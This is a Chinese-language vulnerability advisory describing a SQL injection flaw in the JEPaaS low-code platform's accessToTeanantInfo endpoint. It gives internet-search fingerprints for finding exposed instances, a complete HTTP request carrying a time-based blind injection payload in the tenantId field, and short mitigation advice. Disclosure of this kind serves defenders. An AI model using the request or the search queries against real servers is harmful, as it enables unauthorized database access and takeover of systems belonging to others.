**免责声明**

本文仅用于技术讨论与学习，利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者及本公众号团队不为此承担任何责任。

**漏洞描述**

JEPaaS 低代码平台 accessToTeanantInfo SQL注入漏洞，黑客可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。

**空间测绘**

测绘语法：



```
Fofa：icon_hash="-999810473"
quake：favicon: "cebfb3e5342abd7b01618a0cfbbe0377"
hunter：web.icon="cebfb3e5342abd7b01618a0cfbbe0377"
```

**漏洞复现**

1.SQL注入点POI数据包如下：

```yaml

POST /rbac/im/accessToTeanantInfo HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Language: zh-CN,zh;q=0.9
internalRequestKey: schedule_898901212
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded

tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP(5)))moYz)-- sBPi
```

**修复意见**

1、请联系厂商进行修复。 

2、如非必要，禁止公网访问该系统。

3、设置白名单访问。